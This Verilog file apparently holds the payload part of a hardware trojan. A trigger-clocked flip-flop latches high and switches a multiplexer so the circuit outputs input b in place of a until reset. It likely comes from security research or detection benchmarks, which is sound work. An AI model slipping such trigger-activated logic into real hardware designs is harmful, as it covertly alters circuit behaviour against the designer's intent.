module trojan_payload (trigger,a,b,reset,out);

	input trigger,a,b,reset;
	output out;
	wire Qq,d1;

	assign d1 = 1'b1 ;

	DFF dff_1 (.D(d1),.clk(trigger),.sync_reset(reset),.Q(Qq));

	mux2_1 mux00 (.D0(a),.D1(b),.S(Qq),.Y(out));

endmodule

module DFF (D,clk,sync_reset,Q);
	input D; // Data input
	input clk; // clock input
	input sync_reset; // synchronous reset
	output reg Q; // output Q

	always @(negedge clk)
	begin
		if(sync_reset==1'b1)
			Q <= 1'b0;
		else
			Q <= D;
	end
endmodule

module mux2_1 (D0, D1, S, Y);

	output reg Y;
	input D0, D1, S;

	always @(D0, D1,S)
	begin 
		if (S==1'b1)
			Y<=D1;
		else 
			Y<=D0;
	end
	

endmodule
